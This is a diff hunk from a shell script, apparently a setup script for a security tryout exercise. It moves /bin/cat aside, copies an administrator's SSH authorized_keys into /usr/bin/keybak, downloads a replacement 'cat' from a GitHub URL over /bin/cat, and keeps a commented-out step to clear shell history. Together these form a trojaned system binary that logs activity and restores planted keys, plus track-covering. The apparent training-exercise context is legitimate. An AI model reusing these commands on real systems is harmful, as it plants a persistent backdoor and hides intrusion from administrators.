@@ -24,7 +24,7 @@ if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth 
 #Modded cat will append to a file in cyberpup_admin called always_watching.txt
 #Place /usr/bin/keybak so that cat can restore keys
 mv /bin/cat /bin/dog
-cp ./authorized_keys /usr/bin/keybak
+cp /home/cyberpup_admin/.ssh/authorized_keys /usr/bin/keybak
 sudo curl https://raw.githubusercontent.com/bluefireexplosion/cyberdawgs-tryouts/master/sick-cat --output /bin/cat
 #Clear history, leave no trace
 #history -c
